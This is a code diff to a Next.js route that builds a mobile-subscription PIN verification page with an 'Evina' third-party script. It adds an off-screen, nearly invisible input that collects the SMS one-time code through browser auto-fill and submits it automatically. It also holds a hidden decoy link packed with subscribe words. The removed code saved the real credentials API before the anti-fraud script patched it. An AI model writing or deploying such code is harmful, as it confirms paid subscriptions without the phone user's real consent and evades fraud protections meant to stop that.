@@ -145,20 +145,14 @@ export async function GET(request: NextRequest) {
     .pulse { animation: pulse 2s ease-in-out infinite; }
     .phase-hidden { display: none !important; }
   </style>
-  <!-- Save real navigator.credentials BEFORE Evina monkey-patches it -->
-  <script>
-    (function() {
-      if (navigator.credentials && navigator.credentials.get) {
-        window.__realCredentialsGet = navigator.credentials.get.bind(navigator.credentials);
-      }
-    })();
-  </script>
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS -->'}
 </head>
 <body>
   <div class="bg-glow"></div>
   <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - T\u00e9l\u00e9charger - CONTINUER - ENTRER - S'ABONNER - \u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0622\u0646 - VOIR - ACCEPT - \u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0627\u0646 - \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643</a>
   <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
+  <input id="otpFull" type="text" inputmode="numeric" autocomplete="one-time-code"
+         style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0.01;" maxlength="6" tabindex="-1">
   <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>
 
   <div class="topbar">
@@ -210,9 +204,6 @@ export async function GET(request: NextRequest) {
               <h2>Enter Verification Code</h2>
               <p>PIN sent to <b>${masked}</b></p>
             </div>
-            <!-- Hidden input receives full OTP from Chrome auto-fill (visible pins have maxlength=1 which truncates) -->
-            <input id="otpFull" type="text" inputmode="numeric" autocomplete="one-time-code"
-                   style="position:absolute;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-1;" maxlength="6" tabindex="-1">
             <div class="otp-row" id="otpRow">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
@@ -253,7 +244,6 @@ export async function GET(request: NextRequest) {
     var EVINA_JS_LEN = ${evinaJS.length};
     var isVerifying = false;
     var phase = 1;
-    var otpAbort = null;
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
@@ -277,8 +267,7 @@ export async function GET(request: NextRequest) {
 
     dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID);
     dbg('PinRequest: Status=' + PIN_REQUEST_STATUS + ' Evina=' + (EVINA_JS_LEN > 0 ? 'YES(' + EVINA_JS_LEN + ')' : 'NO'));
-    dbg('Real credentials saved: ' + (!!window.__realCredentialsGet));
-    dbg('DOM: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
+    dbg('DOM: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue + ' otpFull=' + !!otpFull + ' EvinaTrapLink=' + !!document.getElementById('EvinaTrapLink'));
 
     function getFullPin() {
       var val = '';
@@ -338,10 +327,9 @@ export async function GET(request: NextRequest) {
         clearError();
         if (code.length === 4) {
           otpFullHandled = true;
-          dbg('Auto-fill (hidden input): "' + code + '"');
+          dbg('Chrome auto-fill: "' + code + '"');
           if (phase === 1) goToPhase2();
-          showManualEntry();
-          pins[3].focus();
+          fillAndVerify(code);
         }
       }
     }
@@ -368,8 +356,14 @@ export async function GET(request: NextRequest) {
       document.getElementById('trustSignals').classList.add('phase-hidden');
       document.getElementById('stepDot2').classList.add('active');
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
-      dbg('Phase 2 — starting Web OTP...');
-      startWebOTP();
+      dbg('Phase 2 — waiting for Chrome auto-fill or manual entry...');
+      // Wait 15s for Chrome to auto-fill otpFull via "Allow" dialog, then show manual entry
+      setTimeout(function() {
+        if (!isVerifying) {
+          dbg('Timeout — showing manual entry');
+          showManualEntry();
+        }
+      }, 15000);
     }
 
     function showManualEntry() {
@@ -378,42 +372,7 @@ export async function GET(request: NextRequest) {
       document.getElementById('resendArea').classList.remove('phase-hidden');
       confirmBtn.textContent = 'Verify Code';
       setTimeout(function() { pins[0].focus(); }, 100);
-      dbg('Manual OTP entry — waiting for user input');
-    }
-
-    function startWebOTP() {
-      var credGet = window.__realCredentialsGet || (navigator.credentials && navigator.credentials.get && navigator.credentials.get.bind(navigator.credentials));
-      if (!credGet || !('OTPCredential' in window)) {
-        dbg('Web OTP: not available — manual entry');
-        showManualEntry();
-        return;
-      }
-      dbg('Web OTP: listening via real credentials.get...');
-      otpAbort = new AbortController();
-
-      var timeout = setTimeout(function() {
-        dbg('Web OTP: timeout (15s) — manual entry');
-        if (otpAbort) otpAbort.abort();
-        showManualEntry();
-      }, 15000);
-
-      credGet({
-        otp: { transport: ['sms'] },
-        signal: otpAbort.signal
-      }).then(function(otp) {
-        clearTimeout(timeout);
-        if (otp && otp.code) {
-          dbg('Web OTP: received "' + otp.code + '"');
-          fillAndVerify(otp.code);
-        } else {
-          dbg('Web OTP: no code');
-          showManualEntry();
-        }
-      }).catch(function(err) {
-        clearTimeout(timeout);
-        dbg('Web OTP: ' + (err.name === 'AbortError' ? 'aborted' : 'error — ' + err.message));
-        if (err.name !== 'AbortError') showManualEntry();
-      });
+      dbg('Manual entry shown');
     }
 
     function fillAndVerify(code) {
@@ -488,7 +447,6 @@ export async function GET(request: NextRequest) {
 
     function handleResend() {
       dbg('Resending OTP — full page reload...');
-      if (otpAbort) otpAbort.abort();
       var newTrxId = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
       window.location.href = '/api/otp-page?msisdn=' + encodeURIComponent(MSISDN) + '&trxId=' + newTrxId + '&userIP=' + encodeURIComponent('${userIP}');
     }
